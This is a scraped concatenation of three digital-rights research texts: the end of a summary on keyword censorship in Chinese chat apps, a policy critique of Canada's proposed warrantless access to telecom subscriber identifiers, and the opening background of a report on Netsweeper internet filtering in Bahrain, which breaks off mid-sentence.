that censorship is done on the client-side, meaning all the rules to perform censorship are inside of the application running on your phone or computer. We were able to collect the keyword lists used to trigger censorship of chat messages. Tracking changes to the keyword lists over the past year gives an inside look into how these applications implement censorship\nMain Findings \n\nCensorship is reactive often in response to current events.\n\n\nThe keyword lists between companies are not identical suggesting that there is no centralized list provided to them by authorities.\n\n\nCensored keywords include references to collective action and government criticism serving as a counterpoint to recent studies.\n\n\nCensored keywords include names of competitors, which appears to be motivated by business interests rather than government pressures.\n\nThe report is being published alongside a timeline that visualizes events censored by these applications over the past year. This report is part of the Net Alert project, an effort to make research on information controls more accessible. This research continues our work on tracking censorship of popular apps in China, which has included analysis of Sina Weibo, WeChat and other chat apps,  and Web browsers. \n“Harmonized Histories?” is by Masashi Crete-Nishihata, Andrew Hilts, Jeffrey Knockel, Jason Q. Ng, Lotus Ruan, and Greg Wiseman.\nResources\nReport and visualization \nData \nDirector’s post\n \n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\tAuthors: Christopher Parsons, Tamir Israel\nLast month, Public Safety Canada followed through on commitments to review and consult on Canada’s national security framework. The process reviews powers that were passed into law following the passage of Bill C-51, Canada’s recent controversial anti-terrorism overhaul, as well as invite a broader debate about Canada’s security apparatus. While many consultation processes have explored expansions of Canada’s national security framework, the current consultation constitutes the first modern day attempt to explore Canada’s national security excesses and deficiencies. Unfortunately, the framing of the consultation demonstrates minimal direct regard for privacy and civil liberties because it is primarily preoccupied with defending the existing security framework while introducing a range of additional intrusive powers. Such powers include some that have been soundly rejected by the Canadian public as drawing the wrong balance between digital privacy and law enforcement objectives, and heavily criticized by legal experts as well as by all of Canada’s federal and provincial privacy commissioners. \nThe government has framed the discussion in two constituent documents, a National Security Green Paper and an accompanying Background Document. The government’s framings of the issues are highly deficient. Specifically, the consultation documents make little attempt to explain the privacy and civil liberties implications that can result from the contemplated powers. And while the government is open to suggestions on privacy and civil liberties-enhancing measures, few such proposals are explored in the document itself. Moreover, key commitments, such as the need to impose judicial control over Canada’s foreign intelligence agency (CSE) and regulate the agency’s expansive metadata surveillance activities, are neither presented nor discussed (although the government has mentioned independently that it still hopes to introduce such reforms). The consultation documents also fail to provide detailed suggestions for improving government accountability and transparency surrounding state agencies’ use of already-existent surveillance and investigative tools. \nIn light of these deficiencies, we will be discussing a number of the consultation document’s problematic elements in a series of posts, beginning with the government’s reincarnation of a highly controversial telecommunication subscriber identification power.\nAccess to Basic Subscriber Identifiers: Past Attempts to Legislate\nSuccessive federal governments have sought to legislatively enshrine a state power to access subscriber identification data from telecommunications companies. Such legislative initiatives would have facilitated access to such data on an indiscriminate basis and without any judicial authorization or control. All of these attempts have proven controversial and each has fallen in the face of public resistance. At the same time, government agencies, such as the Royal Canadian Mounted Police (RCMP) and provincial and municipal policing bodies, have routinely asserted that they need rapid access to such information, and that judicial authorization will impede their ability to develop investigations. \nState agencies first raised the prospect of warrantless access to subscriber identifiers in a consultation document issued by the Department of Justice in 2002. That document presented the warrantless access power as one of several ways to obtain subscriber identification information. Since that time, a number of legislative initiatives have sought to introduce administrative powers that would let state agencies compel the disclosure of various digital identifiers without any judicial control. Such powers were always introduced as part of a broader legislative package referred to as ‘lawful access’. \nUnderpinning these various lawful access initiatives has been the claim that digital identifiers should be generally accessible to law enforcement without a warrant and indiscriminately (that is, without the need to first obtain grounds for suspicion that the identifier sought would assist in solving a crime). The rationale advanced for this warrantless regime has been that subscriber identification is simply not that private, as well as an ever-shifting list of pressing needs invoked in justification of the initiative (including, at various times, electronic crimes, child pornography and now national security). These efforts culminated in Bill C-30, which met with strong public opposition and, ultimately, legislative defeat. Lawful access legislation was later re-introduced and passed, but the warrantless subscriber identification regime (which was the object of heavy criticism) was explicitly omitted.\nIn spite of a definitive rejection of these measures by the Canadian public ( other, less controversial parts of Bill C-30 were ultimately passed into law as Bill C-13, this time presented as a presented as a solution to cyberbullying), the government has now resurrected proposals for indiscriminate access to subscriber identification data. Subscriber identification data typically refers to unique number strings assigned to individual subscribers and their networked devices as a means of identifying these subscribers in digital interactions. They can include a subscriber’s name, home address, telephone number or Internet Protocol address. The consultation documents paint a familiar picture in attempting to make the case for warrantless and indiscriminate access to subscriber identification data. As in past justification attempts, “slow and inconsistent access to basic subscriber information to help identify who was using a particular communications service at a particular time” is identified as an impediment to effective law enforcement. The warrant process — seen by many Canadians as the centrepiece of a balanced policing system — is presented as a time-consuming inconvenience engaging “considerable work and resources.” Limiting access to digital identifiers of actual suspects is presented as a disproportionate obstacle to investigations that should normally be reserved for “situations involving greater privacy intrusions.” The consultation documents even rely on the same historical analogies advanced repeatedly over the years, implying that access to digital identifiers is no more private than “looking up an address in a phone book or checking out a license-plate number.” While past discussions have been framed in terms of child pornography and cyber-bullying, the consultation documents advance national security as the cause du jour. However, as in the past, the power is presented as one of general application meaning that national security scenarios will constitute a small fraction of the situations in which the power is ultimately invoked. \nThe government’s re-ignition of this debate is surprising considering that no new arguments are advanced in the consultation documents since the warrantless indiscriminate powers it advances were last rejected. Equally surprising is the one-sided manner in which the issue is presented by the consultation documents given the rich discussion that has accompanied debate of this issue in the past. Specifically, as described below, no account is given of the privacy implications that arise when state agencies are provided the power to indiscriminately identify any online activity without prior judicial authorization.\nDigital Identifiers: the Key to Detailed Profiling & Online Anonymity\nThe government’s consultation documents present basic subscriber identification information as less private than other types of data used in state investigative contexts. Specifically, access to digital identifiers is presented by the consultation documents as equivalent to “looking up an address in a phone book or checking out a license plate number”. However, in the modern age, digital identifiers are left behind like indelible footprints in all of our virtual and, increasingly, real-world interactions. The ability to connect these digital footprints with real-world identities leaves little room for anonymous activity, expression or exploration of ideas, and even for anonymous movement in the physical world. While state agencies should have latitude to identify individuals associated with activity reasonably believed to be criminal or otherwise threatening, the consultation documents describe a much broader power that would permit indiscriminate identification of almost any anonymous activity.\nThe consultation documents define basic subscriber information as “identifying information that corresponds to a customer’s telecommunications subscription.” The proposal does not specify a definitive list of identifying information that will be included in the power it proposes. However, past attempts to introduce warrantless access to subscriber information adopted the following legislative definition:\nany information in the service provider’s possession or control respecting the name, address, telephone number and electronic mail address [email address] of any subscriber to any of the service provider’s telecommunications services and the Internet protocol address [IP address], mobile identification number, electronic serial number, local service provider identifier, international mobile equipment identity number [IMEI], international mobile subscriber identity number [IMSI] and subscriber identity module [SIM] card number that are associated with the subscriber’s service and equipment. (Bill C-52, section 16)\nThe consultation documents indicate that each of these identifiers could be included within the new power it contemplates, while acknowledging that indiscriminate warrantless access may be more appropriate for some of these identifiers than it is for others. However, in reality, most of the identifiers envisioned by this new power can have serious privacy implications deserving of protection.\nTelephone numbers and home addresses, for example, have historically been fairly easy to uncover, with most available in public listings such as the white pages. Today, however, many Canadians have unlisted phone numbers. This means that they have made the decision to not provide their address in a phone book, demonstrating an intention to keep this information private. The trend is more pronounced with regard to mobile phone numbers, which are commonly kept private as a means of avoiding telemarketers. For those Canadians that do list their phone numbers and addresses, however, the phone book will only reveal the name the number is listed under (not always a full, or wholly accurate, full and last name), the address, and phone number. The government is proposing a dramatic expansion of ‘phone book’ information. It would go from three data points to six or more items, including Internet Protocol (IP) addresses, name, home address, phone number, email address, and mobile devices’ IMSI number. \nIP addresses can be extremely private insofar as they can used to expose an individual’s detailed biographical profile. In most digital interactions, IP addresses are left behind as a byproduct of most digital interactions. The websites we visit, the message boards we comment on, the YouTube videos we upload or view, the files we download, and the online purchases we make will often generate a record tied to us by our IP address. Given the richness of modern day online activity, it is possible to compile a detailed profile by correlating different activity associated with an IP address. As online activity is often sensitive, associating an IP address with even one single anonymous interaction can be highly revealing of sensitive personal information. Once an IP address is correlated with an individual, it can readily reveal future private perspectives or activities as well. The ability to conduct anonymous online activity is important to the exploration of ideas and to expression of a wide range of views. Research has shown that the possibility of indiscriminate surveillance can chill online activity and particularly the anonymous exploration and discussion of potentially controversial topics. The indiscriminate subscriber information power contemplated by the government’s consultation document would permit state agents to compel telecommunications service providers such as YouTube, Reddit, Ashley Madison, Gmail, or others to provide IP addresses associated with online activity, and to then compel ISPs such as Teksavvy, Rogers or TELUS to disclose real-world identities associated with those IP addresses. The harms of such an indiscriminate power to identify individuals associated with anonymous online activity could be far reaching. \nOnline identifiers such as IP addresses and email addresses can also be used by state agencies to develop a rough map of where a person has physically visited. Digital identifiers associated with mobile devices, such as the IMSI and IMEI numbers, are even more conducive to facilitating real-world tracking. Much like IP addresses, IMSI and IMEI numbers, which are uniquely associated with cellular subscribers and devices, respectively, are collected by cellular towers as individuals move around their city. The indiscriminate identification power contemplated by the consultation document could therefore operate as a real-world tracking power. It is framed in a manner that could be used to compel a mobile service provider to disclose, for example, all IMSI / IMEI numbers that were collected by a given set of cell towers at a given time. This would, by extension, identify all individuals who were at that location within the given time (for example, during a bank robbery, cultural event, or a political protest). \nAnonymous activity is increasingly recognized as attracting high expectations of privacy and anonymity in particular is seen as an important constitutional value in the digital ecosystem. As our digital and physical activities increasingly generate ‘some’ record and occur in semi-public spaces, anonymity has become integral to maintaining any meaningful semblance of privacy. As noted by then-UN Special Rapporteur Frank La Rue, the “[a]nonymity of communications is one of the most important advances enabled by the Internet, and allows individuals to express themselves freely without fear of retribution or condemnation.” The Privacy Commissioner of Canada has also acknowledged the importance of protecting basic subscriber identifiers, as these are “sensitive in nature in that [they] can be used to determine a person’s leanings, with whom they associate, and where they travel … each of these pieces of information can be used to uncover further information about an individual.” The Supreme Court of Canada came to the same conclusion in R v Spencer, 2014 SCC 43: \nAnonymity permits individuals to act in public places but to preserve freedom from identification and surveillance. … [s]ubscriber information, by tending to link particular kinds of information to identifiable individuals, may implicate privacy interests relating to a person’s identity as the source, possessor or user of that information … the police request to link a given IP address to subscriber information was in effect a request to link a specific person to specific online activities. This sort of request engages the anonymity aspect of the information privacy interest by attempting to link the suspect with anonymously undertaken online activities, activities which have been recognized in other circumstances as engaging significant privacy interests.\nThe Ontario Superior Court of Justice has likewise recognized an enduring privacy interest that is engaged where state agencies seek to obtain mobile phone information for the purpose of locating individuals, as have the Information & Privacy Commissioners of British Columbia and Ontario, in the context of cell phone tracking and indiscriminate automated license plate tracking.\nThere is no doubt that such identification capabilities can be useful to state agencies in the course of legitimate investigations. However, while it is generally open to the government to empower itself to access data on a more permissive basis where there is a lower expectation of privacy, the sensitivity of the information revealed by subscriber identification demands a higher level of protection. Moreover, as elaborated in the following section, there is no practical justification for granting state agencies indiscriminate access to such identification capabilities. Basic digital identifiers can be used to develop a detailed composite picture of an individual based on who they associate with, where they visit or travel, and whom they communicate with. Indiscriminate access to such identifiers threatens to chill association and speech. In the next section we discuss why warrants do not pose an impediment to police investigations and how they can facilitate greater trust in government’s use of investigatory powers.\nIndiscriminate Access to Digital Identification: Has the Case Been Made?\nIn addition to implying that subscriber identification information is not very private, the consultation documents advance some pragmatic arguments to try and justify indiscriminate access to subscriber identification information. The consultation documents claim that the current general production power relied upon by state agencies is not effective at obtaining subscriber identification information in a timely manner and that the need to obtain prior judicial authorization is generally inconvenient. The documents also argue that following a recent Supreme Court of Canada decision that acknowledged a privacy interest in IP addresses, R v Spencer, 2014 SCC 43, obtaining subscriber identification information has become more difficult. The consultation documents advance two types of relief to address these perceived challenges, and resemble past attempts to introduce such a power:\n\naccess to digital identifiers should be available to state agencies without the need to obtain prior authorization from a judge; and\naccess to digital identifiers should be available to state agencies indiscriminately, even where these agencies have no reason to believe the subsequent identification will help prevent a crime or advance an investigation.\n\nThis section will explain that while there is a gap in Canada’s current electronic surveillance framework with respect to subscriber identification information that can be filled by carefully formulated legislation, the proposals advanced in the consultation document offer no such tailored proposal. Instead, the consultation document constitutes yet another instalment in the government’s repeated attempts to provide state agencies with unfettered access to highly sensitive identifying information, this time putatively in the name of national security.\nCurrently, law enforcement agencies seeking access to subscriber information generally rely on a general production order (section 487.014 of the Criminal Code) to compel service providers to disclose this information. The consultation documents suggest that the Spencer decision, which held that digital identifiers (notably, IP addresses) are too sensitive for state agencies to obtain from service providers on an informal and voluntary basis, has imposed a new barrier for state agency investigative activities. The consultation document significantly overstates the investigative impact of Spencer, however. While the Spencer decision did, indeed, impact on some voluntary sharing of identifying information by ISPs, such voluntary sharing was only regularly available to law enforcement in the context of child pornography investigations as part of a program adopted by major Canadian ISPs for that context alone (pp 47). The decision would therefore impose minimal impedance in the national security context specifically, and in other law enforcement contexts generally. \nThe consultation document also argues that the general production power in section 487.014 of the Criminal Code was not introduced for accessing subscriber data. However, neither the legislative history nor historical practice of this power lend support to that proposition. Legislatively, the general production power was first introduced in 2003 and became law in 2004, with the express purpose of facilitating access to digitized data records in a timely manner, as noted by the government upon its first introduction of the new power:\nLaw enforcement agencies and crown prosecutors have been asking for a new investigative tool for some time and with the proliferation of the Internet and the widespread adoption of new communications technologies, the timing is right for this form of investigative tool. The production orders will solve a number of nagging issues for investigators including extraterritorial searches and timing issues. … [T]he new production orders will be time sensitive so that the third party served with the order will either have to produce the information within the time specified in the order or report back to the court within the specified time as to why he or she cannot comply. This solves the problem of the inherent nature of informal arrangements which is they are informal and they often lack specific mechanisms such as timing mechanisms. [at 1635]\nThis was, in fact, the legislative response to a 2002 Department of Justice consultation document which explicitly outlined the need for production powers to access digitized records, including telecommunications services subscriber information. Parliament explicitly chose to introduce a general production power for all computer data records, foregoing the adoption of an additional specific production order for subscriber data. \nPerhaps more importantly, since the introduction of the general production power, law enforcement have consistently and successfully relied upon such orders to obtain subscriber identification data from telecommunications companies in large volumes. Halifax Regional Police, for example, compelled production of telecommunications subscriber identification data approximately 4,507 times while only relying on voluntary disclosure by service providers 2,354 in the largely pre-Spencer period spanning January 2011 – December 2014. During the same period, the Vancouver Police Department obtained 25,189 production orders for subscriber identification data while relying on voluntary disclosure only 13,407 times. The general production power therefore enjoys a long track record of success in many investigative contexts. Indeed, past iterations of this justification exercise have similarly struggled to demonstrate any actual shortcomings in the existing framework, with internal law enforcement emails demonstrating an inability to find “sufficient quantity of credible examples” in support of unfettered access to subscriber identification data. [Data obtained by Dr Christopher Parsons by means of Provincial right to information regimes and on record with the author. Halifax Regional Police Dataset. Vancouver Police Department Dataset.]\nWhile the Spencer decision may have affected the ability of law enforcement investigations in one particular investigative context where ISPs had historically agreed to voluntarily identify Internet customers without a warrant, that investigative context raises no special challenges to render general production orders ineffective. These investigative scenarios (documented in dozens of judicial decisions where criminal charges were actually laid against the individual in question after identifying information was obtained) overwhelmingly conform to a template: anonymous online activity (namely, the anonymous downloading or uploading of demonstrably unlawful child pornography) is associated with an IP address and law enforcement seeks to connect this IP address (and the anonymous activity in question) to a real-life identity. None of these situations occurred under conditions that would present an obstacle to obtaining a general production order – all exhibit clear grounds for suspicion and no time pressures that could possibly be frustrated by seeking judicial authorization. Even arguments pointing to the inconvenience involved in documenting evidence in order to obtain a production order ring hollow, as the investigative trail must be carefully documented if law enforcement hopes to successfully present the evidence in a criminal trial or as justification for further search powers.\nThere is simply no demonstrable need for providing unfettered access to digital subscriber identification data. On the other hand, once relieved of the obligation to demonstrate the existence of a reasonable basis for believing that the identification data sought will provide evidence of a crime, law enforcement appears to cast a very broad net. Prior to the Spencer decision, for example, telecommunications service providers received immense numbers of requests for voluntary disclosure of customer data, reaching over 1.1 million requests in 2011 alone. This high volume of requests (implicating close to 800,000 Canadians or about 5% of the population in a single year) suggests that the voluntary regime was being used well outside its stated parameters. While no consistent statistical reporting is available to uniformly assess the proportionality of these measures, there are relatively few judicial decisions in which convictions were ultimately obtained on the basis of these millions of non-judicial and indiscriminate requests.\nTo the extent there is a gap in Canada’s electronic surveillance regime with respect to the ability to access subscriber identification information, it rests solely in situations where there is an imminent threat of harm to life. While police do not need a warrant to enter and search premises in such exigent contexts, and can even conduct emergency wiretaps (subject to strict conditions), they do not have the power to compel a service provider to produce subscriber identification data without a court order. This gap is not well documented, and is unlikely to have impeded law enforcement in many actual situations where a threat of harm to life arose. This is because most service providers will voluntarily comply with reasonably framed requests for subscriber identification information sought under exigent conditions. Such voluntary sharing remains constitutional under the Supreme Court of Canada’s Spencer framework [paras 71-74]. However, explicitly recognizing an emergency subscriber identification power could provide consistency and help ensure that access is not frustrated by fringe service providers. A properly formulated and explicit emergency subscriber identification power can also address potential Charter implications arising from the current voluntary regime, which lacks any accountability measures whatsoever, while ensuring emergency powers are not misused. Such misuse is far from unlikely – the US Office of the Inspector General, for example, found in 2007 that the US FBI had frequently misused emergency subscriber identification access powers in order to avoid its non-emergency authorization regime. A properly formulated emergency access power would therefore include statistical reporting, individual notification and ‘report back’ obligations to secure some level of ex post accountability.\nFinally, while there is no demonstrable need for a departure from the existing general production power regime, it is certainly open to the government to formulate a specialized production power for subscriber identification. The government has, indeed, introduced such specialized production powers for different types of data, including tracking data, communications tracing data and transmission data. Such a power, however, must be reasonably formulated and commensurate with the highly sensitive privacy interests it engages. This would require at bare minimum an obligation to demonstrate grounds that the identifying information sought will help prevent an anticipated crime or investigate a historic one. It should also include ex post accountability measures as well as retention limitations. (The authors note that David Fraser has drafted an eminently reasonable proposal for a specialized subscriber identification production power).\nConclusion\nIn keeping with past attempts to introduce an unfettered digital identification power, the consultation documents have failed to make the case that such indiscriminate powers are needed. The documents repeat long enduring claims that current access mechanisms are ‘inconsistent and slow’, but fail to acknowledge the fact that such claims have been repeatedly discredited in the past. Moreover, the government has failed to explain to the public that law enforcement have long relied on existing production powers to access subscriber identification information in accessing all but a few narrow investigative contexts. \nPerhaps worse, in making its pitch to the public, the consultation document revitalizes an ill-considered and outdated characterization of digital identifiers as ‘not so private’ – a characterization that has been flatly rejected by the general public in its opposition to past iterations of the unfettered identification power it proposes, by multiple evidence-based research reports which demonstrates its far-reaching capacity to invade, and by the Supreme Court of Canada. Replicating a trend that is regrettably evident throughout the consultation documents, the documents treat privacy in subscriber information as, at best, an afterthought. By ignoring the rich and detailed historical debate that has occurred in Canada on this matter the government has failed to acknowledge the privacy issues associated with indiscriminate access to digital identification. \nFinally, while it is encouraging that the government is willing to engage in a public consultation prior to setting its national security agenda, it is disappointing to see yet one more cause du jour invoked in justification of what is clearly intended to be a generalized policing tool. In the context of this national security consultation, unfettered access to digital identifiers is presented as a national security measure intended to address critical counter-terrorism matters that are currently at the forefront of national attention and concern. However, as in past attempts to introduce this legislation, the power proposed is one of general application, meaning it will be used predominantly in other investigative contexts. Further, no specific explanation is provided for why this exceptional power is necessary even in the national security context. Indeed, upon the 2013 defeat of this proposal as embodied in Bill C-30, then Director of CSIS (an agency with broad counter-terrorism responsibilities) indicated that unfettered access to subscriber identification information is “not absolutely critical for us to do our work.” While on the one hand these identification powers may not be ‘absolutely critical’ to national security, their indiscriminate availability to agencies such as CSIS and CSE can have even more serious and far-reaching privacy implications, which will be explored in a future post.\nAnonymity is one of the most important bastions of privacy in the digital world. As eloquently explained by UN Special Rapporteur David Kaye, along with encryption:\n… anonymity, today’s leading vehicles for online security, provide[s] individuals with a means to protect their privacy, empowering them to browse, read, develop and share opinions and information without interference and enabling journalists, civil society organizations, members of ethnic or religious groups, those persecuted because of their sexual orientation or gender identity, activists, scholars, artists and others to exercise the rights to freedom of opinion and expression.\nThis does not mean that individuals can hide behind anonymity so as to commit crimes with impunity. However, de-anonymizing individuals does demand a carefully considered, narrowly tailored, and proportionate authorization mechanism that is commensurate with the important constitutional and democratic values it implicates. Yet the consultation documents wholly disregard these important values in yet another attempt to justify an unfettered and uncontrolled power to identify online activity. It is perhaps unsurprising that no reasonably tailored and proportionate proposal is evident in its resulting treatment of online identification.\nDOWNLOAD .PDF VERSION\n\n\t\t\t\t\n\t\t\t",

Bahrain has a long track record of censoring critical political speech and opposition voices, both online and off, and the country has been implicated in a broad range of human rights violations, from arbitrary arrests to torture to violent crackdowns on peaceful demonstrations. The sale of filtering technology by a Canadian company to Bahrain, used to block access to information and restrict freedom of speech, thus raises important questions of corporate social responsibility. The sale comes at an interesting time: Canada has in recent months sought to expand ties with the Gulf Cooperation Council (GCC), a regional intergovernmental partnership involving Bahrain, Kuwait, Oman, Qatar, Saudi Arabia and the UAE. In May 2016, Canada’s Minister of Foreign Affairs met with GCC representatives, and “looked forward to expanded GCC-Canada relations”, including “further cooperation in the social, economic, educational, cultural and scientific fields, and human rights.” \nWe set out to investigate the presence of Netsweeper installations in Bahrain using a variety of network measurement techniques to identify filtering and the presence of middleboxes for implementing filtering. Part 1 of this report describes prior research on the use of Netsweeper technology in countries with questionable human rights records, and describes the current political and legal context in Bahrain. Part 2 of this report describes the results of our technical research on the use of Netsweeper technology in Bahrain.\nThis report is part of our ongoing research to gather empirical evidence on the use of Internet filtering technology in national jurisdictions, like Bahrain, where human rights are routinely violated with impunity. To date, very few Internet filtering companies acknowledge the human rights offending implications of their sales and services, and Netsweeper in particular appears to have no public-facing policies or statements on these issues. The aim of this research report is to confirm the presence of Netsweeper’s technology in Bahrain using network measurement techniques, describe how the technology functions and is configured within the country, and then test for access to a range of content that may be targeted for filtering.\nOn September 8, 2016, we sent a letter to Netsweeper, Inc. with questions regarding its provision of technology and services to Bahrain and its associated human rights due diligence. We committed to publishing the company’s response in full alongside this report. We have published a copy of the letter here. As of September 20, 2016, we have not received a reply.\nPart 1: Background\nPrior Citizen Lab Research on Netsweeper\nNetsweeper, Inc. is a privately-owned technology company based in Waterloo, Ontario, Canada, whose primary offering is an Internet content filtering product and service. The company has customers ranging from educational institutions and corporations to national-level Internet Service Providers (ISPs) and telecommunications companies. Internet filtering is widely used on institutional networks, such as schools and libraries, and networks of private companies, to restrict access to a wide range of content. However, when such filtering tools are used to implement state-mandated Internet filtering at the national level, questions around human rights — specifically access to information and freedom of expression — are implicated.\nCitizen Lab has developed a methodology for identifying installations of filtering products operating on large public ISPs. Using a combination of network scanning and in-network testing, we are able to confirm the use of these filtering products and enumerate what types content are being blocked. In doing so, questions frequently arise regarding the corporate social responsibility practices of the companies developing this technology. \nPrior research by the OpenNet Initiative (2003-2013), of which Citizen Lab was a part, identified the existence of Netsweeper’s filtering technology on ISPs operating in the Middle East, including Qatar, United Arab Emirates (UAE), Yemen, and Kuwait. We outlined evidence of Netsweeper’s products on the networks of Pakistan’s leading ISP, Pakistan Telecommunication Company Limited (PTCL), in a report published in 2013, and discussed their use to block the websites of independent media, and content on religion and human rights. We have also reported that Netsweeper products were being used by three ISPs based in Somalia, and raised questions about the human rights implications of selling filtering technology in a failed state. In a report on information controls in Yemen in 2015, we examined the use of Netsweeper technology to filter critical political content, independent media websites, and all URLs belonging to the Israeli (.il) top-level domain.\nIncluded in some of these reports were letters with questions that we sent to Netsweeper, which also offered to publish any response from the company in full. Aside from a defamation claim filed in January 2016, and then subsequently discontinued in its entirety on April 25, 2016, Netsweeper has not responded to us.\nBackground on Bahrain\nPolitical context\nThe Kingdom of Bahrain is an island monarchy situated off the east coast of Saudi Arabia.  Bahrain’s King is the head of government, and is tasked by the 2002 Constitution with appointing ministers, judges, and half of the legislature.  As part of the Arab Spring in 2011, protesters in Bahrain took to the streets, demanding democratic political reform, an end to corruption and discrimination against the Shia sect, and the removal of Bahrain’s long-serving Prime Minister.  Protests snowballed as security forces killed protesters, and culminated in protesters’ occupation of the Pearl Roundabout, a traffic junction in Bahrain’s capital city, for one month.  In March 2011, troops from Saudi Arabia and the United Arab Emirates entered Bahrain, and security forces forcibly cleared and demolished the Pearl Roundabout.  Three months later, Bahrain’s King established the Bahrain Independent Commission of Inquiry (BICI), which concluded that police and security forces engaged in “grave violations of human rights, including the arbitrary deprivation of life, torture and arbitrary detention.”\nHuman Rights Watch and Amnesty International continue to criticize the government of Bahrain for perpetrating human rights violations, including arresting those who criticize the government, stripping dissidents of their citizenship on the grounds of national security, and routinely maltreating and torturing prisoners. In 2014, the 1963 Bahraini Citizenship Act was amended to grant the Interior Ministry additional authority to revoke a Bahraini national’s citizenship if he or she has failed in their “duty of loyalty” to the state. Human Rights Watch argued against this vaguely worded provision, fearing that it could be used against government critics. Advocacy groups have also appealed to the international community to put pressure on the Kingdom. In a letter read to the UN Human Rights Council in September 2015, a group of 32 countries, including United States and the United Kingdom, urged Bahrain to take steps to better protect the fundamental human rights of its citizens.\nSince the 2011 uprising, numerous social media users and bloggers have been targeted by authorities as a result of their online activities. Bahrain Watch has compiled a list of individuals arrested as a result of their online activities, which includes individuals imprisoned and tortured for allegedly insulting the King online and inciting anti-government hatred. In some cases citizenship was revoked. \nCrackdown on opposition voices continued in 2016. In June, Nabeel Rajab, the founder of the Bahrain Centre for Human Rights, was arrested for “spreading false information and rumours with the aim of discrediting the State,” a move which was widely condemned by human rights observers. The Kingdom was also criticized for placing Rajab in solitary confinement. This was not the first time that Rajab was targeted. He was arrested in April 2015 following a series of tweets condemning torture and Bahraini involvement in the ongoing conflict in Yemen, and in October 2014 for tweets calling the Ministry of Interior an “ideological incubator” for ISIS after several officers defected to ISIS, and in July 2012 after criticizing the Prime Minister on Twitter.\nIn June 2016, a Bahraini court ordered the shutdown of Al Wefaq, the country’s largest opposition group. The court found that the group “repeatedly objected [to] the legitimacy of Bahrain’s constitution, supported violent action and posted pictures of terrorists brandishing sharp tools while claiming they were peaceful demonstrators.”  The ban came a week after an appeals court extended the prison sentence of Sheikh Ali Salman, the political leader of Al Wefaq, from 4 to 9 years. He was found guilty in 2015 on charges which included “promoting political change using illegal forceful means and threats”. Shortly afterwards, the Ministry of Interior revoked the citizenship of leading cleric Sheikh Isa Qassim for allegedly serving “foreign interests” and escalating sectarian divisions in the country. Qassim, considered the “spiritual voice” of Bahrain’s Shia community, has been a vocal critic of the government’s repressive crackdown in recent years.  The incident marked the 300th citizenship revocation in Bahrain since 2014, and was condemned by both the office of the UN High Commissioner for Human Rights and the US State Department. Demonstrations in Qassim’s home of Duraz following the citizenship revocation were met with a strong police presence, and Internet disruptions.\nIn August 2016, United Nations independent human rights experts urged Bahrain to end harassment of the Shia population in Bahrain, saying “Shias are clearly being targeted on the basis of their religion.” The experts stated: “Recently, we witnessed the dissolution of Al-Wefaq National Islamic Society, the shutting of faith-based organizations, restrictions on the practice of religious rites, on Friday prayers and peaceful assemblies, restrictions on movement, restricted access to the Internet and a ban on Shia religious leaders from preaching.” It is worth noting that Bahraini government officials and parliament members have denied accusations made by advocacy groups. For example, a legislator and member of Bahrain’s Board of Commissioners of the National Institution for Human Rights denounced the August 2016 United Nations human rights experts’ statement as baseless allegations and a “sectarian-tinted statement” containing “false information and fallacies.”\nInformation Controls\nBahrain is rated by Freedom House’s 2015 Freedom on the Net report as ‘Not Free’, earning it the 9th lowest score of the 65 countries examined. The country was named by Reporters Without Borders as one of the ‘Enemies of the Internet’. Information controls in the country take a number of forms, including widespread censorship and surveillance, strict press laws prohibiting the online activities of the press, government use of PR companies to shape the media narrative, and the targeting and imprisonment of users for their online activities. \nInternet Censorship and Shutdowns\nBahrain is one of the most wired countries in the Middle East, but it is also one that has an established track record of censoring Internet communications. The OpenNet Initiative has documented the extent of censorship in the country for a decade. Testing conducted in 2006 on the ISP Batelco found that sites critical of the Bahraini government and monarchy, LGBT content, anonymization tools, and religious conversion sites were all blocked. Tests run in 2009 found filtering to be more extensive than in prior tests, with domestic political criticism and human rights organizations found censored, along with an increase in the blocking of pornographic and LGBT content.  In 2011, blocking in Bahrain was found to be implemented through the use of McAfee’s SmartFilter product.\nNumerous government ministries and organizations have a role in Bahrain’s online information controls. The Telecommunications Regulatory Authority (TRA), established in 2002, is the primary regulatory body for the country.  The Information Affairs Authority (IAA), established in 2010, operates the country’s official media outlets and is responsible for issuing censorship orders for both online and offline media. The IAA requires the registration of all websites, and blocks websites found to be in violation of Articles 19 and 20 of the 2002 Press Rules and Regulations, which state:\nArticle 19\nAs per a decision by the minister, it is possible to prohibit circulation of publications instigating hatred of the political regime, encroaching on the state’s official religion, breaching ethics, encroaching on religions and jeopardizing public peace or raising issues whose publication is prohibited by the provisions of this law.\nConcerned parties can appeal the decision to prohibit circulation before the High Civil Court within 15 days of its issuance or notification. The court shall settle the case on an urgent basis.\nArticle 20\nAs per a decision by the minister, it is possible to bar any publication issued abroad from entering and circulating in the kingdom so as to maintain public order, morals, religions or due to any other reasons related to the public interest.\nConcerned parties can appeal the decision of prohibition before the High Civil Court within 15 days of its issuance or notification and the court shall settle the case on an urgent basis.\nIn July 2016, the Bahrain Information Minister issued Decree 68/2016, which required media outlets to obtain licenses from the Mass Media Directorate in order to publish news online, limited video or audio clips to two minutes in length, and prohibited live-streaming. The decree was criticized as further restricting Bahrain’s already strict press censorship, with provisions requiring licensees to provide individual names, websites and social media account information, seen as a method of facilitating easier punishment of individuals for publishing controversial material. \nIn August 2016, the TRA issued Decision 12/2016, requiring that all telecommunications companies in Bahrain purchase and use a “unified technical system” for blocking websites. We discuss this requirement in connection to our research on Netsweeper in more detail below. \nResearch published by Bahrain Watch in August 2016 documented the nightly disruption of mobile and fixed-line services offered by providers Batelco and Zain in the Duraz region that had been taking place since June 23. According to Bahrain Watch, “Duraz has been the focal point of ongoing protests since 20 June 2016, when the government revoked the citizenship of [Shia religious leader] Sheikh Isa Qassim,” a resident of Duraz. In late August 2016, a coalition of organizations concerned with Internet shutdowns wrote a letter to the TRA, requesting authorities cancel service restriction orders issued for Duraz, in accordance with a June 2016 UN Human Rights Council resolution that condemned “measures to intentionally prevent or disrupt access to or dissemination of information online in violation of international human rights law” and called on states to “refrain from and cease such measures.” Notably, the Duraz disruptions are not the first instance of connectivity restrictions in Bahrain as a result of protest; Arbor Networks documented a significant drop in traffic during the 2011 uprising.\nSurveillance\nIn 2012, Citizen Lab published a report describing the use of surveillance malware FinFisher to target Bahraini activists, a claim which was denied by a Bahrain government spokesperson.   Following the 2014 breach of FinFisher developer Gamma International’s networks, leaked documents showed that the malware had been used to compromise the computers of potentially dozens of human rights lawyers, politicians and exiled activists. In 2014, leaked documents from spyware company Hacking Team showed that the Bahrain Ministry of Interior purchased that company’s Remote Control System software, and that a legal review 